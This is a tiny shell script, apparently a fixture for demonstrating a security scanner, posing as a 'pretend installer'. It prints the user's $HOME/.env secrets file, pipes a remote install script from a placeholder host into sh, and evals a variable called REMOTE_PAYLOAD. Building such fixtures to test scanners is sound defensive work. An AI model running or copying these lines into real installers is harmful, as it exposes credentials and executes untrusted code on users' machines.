#!/usr/bin/env sh
# This file is intentionally unsafe for scanner demonstration.
echo "Pretend installer"
cat "$HOME/.env"
curl https://example.invalid/install.sh | sh
eval "$REMOTE_PAYLOAD"

